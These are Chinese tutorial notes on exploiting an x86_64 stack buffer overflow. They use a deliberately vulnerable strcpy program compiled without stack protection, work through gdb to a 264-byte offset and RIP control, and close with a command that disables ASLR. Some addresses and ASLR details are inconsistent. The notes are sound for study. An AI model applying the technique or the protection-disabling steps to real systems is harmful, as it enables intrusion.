# 栈溢出

## 函数调用 回顾

（若该函数有参数传入   则先进行参数入栈。一般从左到右）

```
1.call   xxxx  
入栈返回地址 ，即call指令的下一个地址（rip执行）并且跳转到  指令 xxxx
（然后开始栈帧调整）
push ebp 			；保存旧栈帧的底部

mov ebp，esp   ；设置新栈帧的底部（栈帧切换）

sub esp，xxx    ；设置新的栈帧的顶部（抬高栈顶，为新栈帧开辟空间）


**2.局部变量入栈**


**3.调用结束后**

函数返回

保存返回值：通常将函数的返回值保存在寄存器 EAX 中

弹出当前栈帧，恢复上一个栈帧具体命令：

add	esp, xxx 	;降低栈顶，回收当前的栈帧			

pop ebp			;将上一个栈帧底部位置恢复到 ebp		

Retn			; 这条指令有两个功能	：
						a)弹出当前栈顶元素，即弹出栈帧中的返回地址。 至此栈帧恢复工作完成 。
						b)让处理器跳转到弹出的返回地址，恢复调用前的代码区
```





## 1.x86和x86_64的区别

​		主要区别就是内存地址的大小。不过即便 **x86_64** 内存地址有64位长用户空间也只能使用前47位，要牢记这点，因为当你指定一个大于0x00007fffffffffff的地址时会抛出一个异常。那也就意味着0x4141414141414141会抛出异常而0x0000414141414141是安全的。

​		事实上还有很多其他的不同但是考虑到本文的目的不了解所有的差异也没关系。

## 2.漏洞代码片段

```
//bof.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int main(int argc, char **argv) {
char buffer[256];
if(argc != 2) {
exit(0);
}
printf("%p\n", buffer);
strcpy(buffer, argv[1]);
printf("%s\n", buffer);
return 0;
}

```

可以用gcc编译上述代码。

```
$ gcc -m64 bof.c -o bof -z execstack -fno-stack-protector -g
//-z 与关键字 execstack 一起直接传递给链接器。
//-fno-stack-protector -o test test.c 禁用栈保护
```

代码分析：

```
溢出发生在 strcpy，将main函数调用前入栈的rip的值覆盖
触发发生在main函数调用结束，ret返回时弹出溢出的rip 并且执行。
```



## 3.触发溢出 

首先确认一下确实可以让这个进程崩溃。

```
$ ./bof $(python -c 'print "A" * 300)
```

![image-20220901193929208](栈溢出.assets//image-20220901193929208.png)

首先观察strcpy后的栈的情况

```
gdb -tui bof 
layout asm 
b strcpy   			//在strcpy处下断点
r $(python -c 'print "A" * 300')
finish   			//将函数strcpy执行完毕
x/20xg $rsp   		//查 64 位程序内存信息
	/* x 指令用于查看内存地址的值  具体看gdb调试文档
```

![image-20220903133351658](4.栈溢出.assets/image-20220903133351658.png)

观察执行到ret时的寄存栈的情况

![image-20220903133624163](4.栈溢出.assets/image-20220903133624163.png)

可以看到leave指令把rsp指向0x7fffffffde98。此时观察寄存器的值，

```
info reg
```

![image-20220903134028493](4.栈溢出.assets/image-20220903134028493.png)

并观察rip中的值

![image-20220903135528338](4.栈溢出.assets/image-20220903135528338.png)



在次单步执行时程序结束，但是没有控制rip，原因就是覆盖了太多位  

最大的地址是0x00007fffffffffff   而我们尝试用0x4141414141414141去溢出了。

## 0x04 控制RIP

​	用个小一点的缓冲区去溢出这样指向rsp的地址就会像0x0000414141414141一样了。

​	通过简单的数学运算就可以很轻松地算出我们缓冲区的大小。我们知道缓冲区开始于0x7fffffffdd90。Leave指令之后rsp将指向0x7fffffffde98。

```
0x7fffffffde98-0x7fffffffdd90 = 0x108 -> 十进制的264
```

因此，我们可以修改缓冲区

```
"A" * 264 + "B" * 6
```

此时rsp指向的地址应该像0x0000424242424242一样正常了。那样就能控制RIP。

```
gdb -tui bof 
layout asm 
b strcpy   			//在strcpy处下断点
run $(python -c 'print "A" * 264 + "B" * 6')
finish   			//将函数strcpy执行完毕
```

直接查看调用leave指令后的栈的情况

![image-20220903154530970](4.栈溢出.assets/image-20220903154530970.png)

​	rsp指向0x7fffffffdeb8而0x7fffffffdeb8的内容就是0x0000424242424242。

接着再次单步进入，执行ret指令 。 如下图 ，rip变成了理想的值。

![image-20220903154950321](4.栈溢出.assets/image-20220903154950321.png)

## 5. 跳入用户控制的缓冲区

​	只需要将rip改为缓冲区的开头,也就是在strcpy后`printf` 显示出来的值。

在改变传入的参数后，缓冲区的起始地址为‘`0x00007fffffffddb0`。通过 `gdb` 也可以很容易地重新获得这个值,只需在调用 `strcpy` 之后显示栈。

![image-20220903155740972](4.栈溢出.assets/image-20220903155740972.png)

 重新构造缓冲区：

```
"A" * 264 + "\x7f\xff\xff\xff\xdd\xb0"[::-1]
```

因为是小端结构所以我们需要把内存地址反序。这就是python语句[::-1]所实现的。

然后gdb调试，确认rip是否为理想值

```
gdb -tui bof 
layout asm 
b strcpy   			//在strcpy处下断点
run $(python -c 'print "A" * 264 +"\x7f\xff\xff\xff\xdd\x10"[::-1]')
finish   			//将函数strcpy执行完毕
```

![image-20220903160155589](4.栈溢出.assets/image-20220903160155589.png)

这是leave指令后的栈，上图中rsp指向0x7fffffffdeb8,而地址0x7fffffffdeb8的内容是0x00007fffffffdd10。最后0x00007fffffffdd10指向我们控制的缓冲区。

​	ret指令执行后，会将rsp中的内容   pop rip。如下图 rip指向0x00007fffffffdd10说明跳入了正确的位置。

![image-20220903161117594](4.栈溢出.assets/image-20220903161117594.png)

# 6.执行shellcode









#### ALSR

aslr是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的的一种技术。如今Linux，Windows等主流操作系统都已采用了该技术。



ALSR由 `/proc/sys/kernel/randomize_va_space` 决定，默认为2

```
0 - 表示关闭进程地址空间随机化

1 - 表示将mmap的基址，stack和vdso页面随机化。

2 - 表示在1的基础上增加栈（heap）的随机化。
```

要关闭ALSR，只需将`randomize_va_space`里面的内容改为0即可。

修改该文件不能直接用 `vi` 或者 `vim` 进行修改,也不能直接 `sudo echo 0 > /proc/sys/kernel/randomize_va_space`

使用此条命令即可关闭ALSR：`sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"`



